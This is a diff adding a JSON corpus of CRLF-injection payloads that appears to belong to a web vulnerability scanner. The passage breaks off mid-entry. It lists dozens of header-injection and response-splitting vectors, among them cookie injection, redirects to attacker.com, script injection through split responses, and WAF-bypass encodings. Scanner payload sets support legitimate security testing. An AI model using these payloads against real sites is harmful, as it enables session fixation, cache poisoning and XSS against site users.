@@ -1,0 +1,1444 @@
+{
+  "version": "5.1.0",
+  "category": "crlf",
+  "payloads": [
+    {
+      "id": "crlf.header.set_cookie",
+      "vector": "%0d%0aSet-Cookie:%20WSScrlf=WSSc4n4ry7788",
+      "description": "Inject a Set-Cookie header via CR-LF in a reflected value.",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "WSSc4n4ry7788",
+      "confidence": "MEDIUM",
+      "severity": "Medium",
+      "expected_evidence": [
+        "Set-Cookie: WSScrlf=WSSc4n4ry7788"
+      ],
+      "references": [
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md"
+      ],
+      "tags": [
+        "set-cookie"
+      ]
+    },
+    {
+      "id": "crlf.header.custom_marker",
+      "vector": "%0d%0aX-WSS-CRLF:%20WSSc4n4ry7788",
+      "description": "Inject a uniquely-named marker header — unambiguous confirmation.",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "WSSc4n4ry7788",
+      "confidence": "MEDIUM",
+      "severity": "Medium",
+      "expected_evidence": [
+        "X-WSS-CRLF: WSSc4n4ry7788"
+      ],
+      "tags": [
+        "marker"
+      ]
+    },
+    {
+      "id": "crlf.header.lf_only",
+      "vector": "%0aX-WSS-CRLF:%20WSSc4n4ry7788",
+      "description": "LF-only variant for servers that split on bare \\n.",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "WSSc4n4ry7788",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "waf_bypass": true,
+      "tags": [
+        "lf-only"
+      ]
+    },
+    {
+      "id": "crlf.header.cr_only",
+      "vector": "%0dX-WSS-CRLF:%20WSSc4n4ry7788",
+      "description": "CR-only variant.",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "WSSc4n4ry7788",
+      "confidence": "LOW",
+      "severity": "Low",
+      "waf_bypass": true,
+      "tags": [
+        "cr-only"
+      ]
+    },
+    {
+      "id": "crlf.wafbypass.unicode_overlong",
+      "vector": "%E5%98%8A%E5%98%8DX-WSS-CRLF:%20WSSc4n4ry7788",
+      "description": "Unicode 0x560A/0x560D that some stacks downcast to CR/LF.",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "WSSc4n4ry7788",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "waf_bypass": true,
+      "references": [
+        "https://www.invicti.com/blog/web-security/crlf-http-header"
+      ],
+      "tags": [
+        "unicode",
+        "waf-bypass"
+      ]
+    },
+    {
+      "id": "crlf.split.response_xss",
+      "vector": "%0d%0a%0d%0a<script>alert('WSSc4n4ry7788')</script>",
+      "description": "Double CR-LF ends headers and injects a body — response-splitting to XSS.",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "WSSc4n4ry7788",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "min_intrusion_level": "low",
+      "tags": [
+        "response-splitting",
+        "xss"
+      ]
+    },
+    {
+      "id": "crlf.location.dest_param",
+      "vector": "/%0d%0aLocation:%20https://evil-webscanner-test.invalid",
+      "description": "CR-LF in a redirect 'dest' param overriding Location (GFI KerioControl 2025 class).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "owasp": "A03:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "location",
+        "redirect"
+      ]
+    },
+    {
+      "id": "crlf.legacy.01aaa9e920",
+      "vector": "%0d%0aUpgrade: h2c",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.01d8c06591",
+      "vector": "%0d%0aSet-Cookie:%20admin=true",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.036c2b3d82",
+      "vector": "%0d%0aSet-Cookie:%20sessionid=malicious",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.03c1296821",
+      "vector": "%0d%0aCross-Origin-Opener-Policy: unsafe-none",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.051964af31",
+      "vector": "%0d%0aDevice-Memory: 8",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.05b49f8219",
+      "vector": "%0d%0aCross-Origin-Resource-Policy: cross-origin",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.066bac5b59",
+      "vector": "%0d%0aAccept-Ranges: bytes",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.06b0468106",
+      "vector": "crlf%0dLocation:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.09e875b770",
+      "vector": "%0d%0aAccess-Control-Allow-Credentials: true",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.09f5210e9d",
+      "vector": "%0d%0aContent-DPR: 2.0",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.0ac843f321",
+      "vector": "%0d%0aTransfer-Encoding: chunked",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.0bbdf7d186",
+      "vector": "%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Injected</html>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.0d079459a4",
+      "vector": "crlf\\rLocation: http://attacker.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.10f4e28c78",
+      "vector": "%2f%2e%2e%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.115a7a55ce",
+      "vector": "?%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.1768b41c57",
+      "vector": "%0d%0aContent-Language: en",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.1b34f680d8",
+      "vector": "\\r\\n",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.1b41e27cac",
+      "vector": "//%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.20c3fa1286",
+      "vector": "%0d%0aX-AspNet-Version: 4.0.30319",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.238ded2dd0",
+      "vector": "%0d%0aX-Original-URL: /admin",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.24214b2e4c",
+      "vector": "%0d%0aPragma: no-cache",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.27e85a3b7c",
+      "vector": "%0d%0aRefresh: 0;url=http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.2a07f94221",
+      "vector": "%0d%0aLocation: javascript:alert(1)",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.2d0fd6aa84",
+      "vector": "%0d%0aVary: Accept-Encoding%0d%0aContent-Length: 0%0d%0a%0d%0a",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.2ee9425c36",
+      "vector": "/%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.3038479d34",
+      "vector": "&%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.3428bee1fb",
+      "vector": "%0d%0aStatus: 301 Moved Permanently%0d%0aLocation: http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.3afd82beeb",
+      "vector": "\\r\\nSet-Cookie: admin=true",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.3bdea73cec",
+      "vector": "%0d%0aAccess-Control-Allow-Headers: *",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.3e6ec3dd6a",
+      "vector": "%0d%0aProxy-Authenticate: Basic realm=\"Proxy\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.3ef8071af3",
+      "vector": "%3f%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.44cc73e82e",
+      "vector": "%0d%0aPermissions-Policy: geolocation=*",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.477c10d3c5",
+      "vector": "%0d%0aServer: Apache/2.4.1 (Unix)",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.4b2a2d1fb3",
+      "vector": "%0d%0aX-Content-Type-Options: nosniff",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.4db2899705",
+      "vector": "%0d%0aSave-Data: on",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.4de8a3fca4",
+      "vector": "%0d%0aAccess-Control-Allow-Methods: GET, POST, PUT, DELETE",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.50cbd3abaf",
+      "vector": "%23%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.535c15aaf7",
+      "vector": "%0d%0aContent-Disposition: attachment; filename=\"malicious.exe\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.568ae80a7a",
+      "vector": "%0D%0ASet-Cookie:PHPSESSID=malicious",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.5a2c2c8184",
+      "vector": "%0d%0aStrict-Transport-Security: max-age=0",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.5fc13ef2a5",
+      "vector": "%0d%0aWarning: 299 - \"Miscellaneous warning\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.64fd65874a",
+      "vector": "%0aSet-Cookie:admin=true",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.67a388126f",
+      "vector": "%E5%98%8A%E5%98%8D%0aLocation:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.6868720e76",
+      "vector": "%0d%0aCross-Origin-Embedder-Policy: unsafe-none",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.69871f5c71",
+      "vector": "%0d%0aWWW-Authenticate: Basic realm=\"Protected\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.6a4682c9fd",
+      "vector": "%0d%0aReferrer-Policy: unsafe-url",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.6c411dd48e",
+      "vector": "%0d%0aHTTP/1.1 500 Internal Server Error%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Error</h1>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.6cc00c7aa8",
+      "vector": "%E5%98%8A%E5%98%8DLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.73edb598b6",
+      "vector": "%0d%0a",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.740e495795",
+      "vector": "%0dLocation:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.778ddfee60",
+      "vector": "%0d%0aPublic-Key-Pins: max-age=0",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.78d1633b0a",
+      "vector": "%0d%0aConnection: close",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.791e700542",
+      "vector": "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<html>Defaced</html>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.7afb67caea",
+      "vector": "%0d%0aContent-Range: bytes 0-1023/146515",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.7e52d94a3d",
+      "vector": "\\r\\nLocation: http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.7fc187f15c",
+      "vector": "%0d%0aFeature-Policy: microphone 'none'",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.824bc5d156",
+      "vector": "%0d%0aAllow: GET, POST, DELETE",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.840ebd10ac",
+      "vector": "%0d%0aSet-Cookie:%20injected=1%3B%20HttpOnly",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy",
+        "source:master"
+      ]
+    },
+    {
+      "id": "crlf.legacy.8770ba6949",
+      "vector": "%0d%0aRTT: 100",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.8b01349851",
+      "vector": "%0d%0aLocation:%20http://attacker.com%0d%0aContent-Length:%200%0d%0a%0d%0a",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.8efcadfdf1",
+      "vector": "%0d%0aX-XSS-Protection:%200",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.8fe8bea418",
+      "vector": "%0d",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.91f1daa874",
+      "vector": "%0d%0aAge: 12",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.9355983173",
+      "vector": "%0d%0aRetry-After: 3600",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.962af0b365",
+      "vector": "crlf%0aLocation:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.98742007b2",
+      "vector": "%0d%0a%0d%0a<script>alert(document.cookie)</script>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.9c2eddc22f",
+      "vector": "%20%0d%0aLocation:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.9e62f88620",
+      "vector": "%0d%0aContent-Encoding: gzip",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.a02460d6a2",
+      "vector": "%0d%0aECT: 4g",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.a28048ef7f",
+      "vector": "%0d%0aViewport-Width: 1920",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.a607f92fa5",
+      "vector": "%0a",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.aa2d1962c8",
+      "vector": "%0d%0aLink: <http://attacker.com>; rel=\"canonical\"",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.aa627e4294",
+      "vector": "%0d%0aX-Forwarded-Host: attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.af1182d24e",
+      "vector": "%2e%2e%2f%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.b3fdb6cd88",
+      "vector": "%0d%0a%0d%0aHTTP/1.1 302 Found%0d%0aLocation: http://attacker.com%0d%0a%0d%0a",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.b6c9ff81f4",
+      "vector": "%2f%0d%0aLocation:%20http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.b8276e20fc",
+      "vector": "%0d%0aHost: attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.b8b1a2cef2",
+      "vector": "%0aLocation:http://attacker.com",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.b9eb710843",
+      "vector": "%0ASet-Cookie:JSESSIONID=malicious",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.be37a6be56",
+      "vector": "%0d%0a%0d%0a<html><body>Injected Content</body></html>",
+      "description": "Imported from the legacy corpus (response_splitting).",
+      "context": "response_splitting",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "crlf.legacy.c3796d883e",
+      "vector": "%0d%0aAccess-Control-Allow-Origin: *",
+      "description": "Imported from the legacy corpus (header_injection).",
+      "context": "header_injection",
+      "cwe": "CWE-113",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
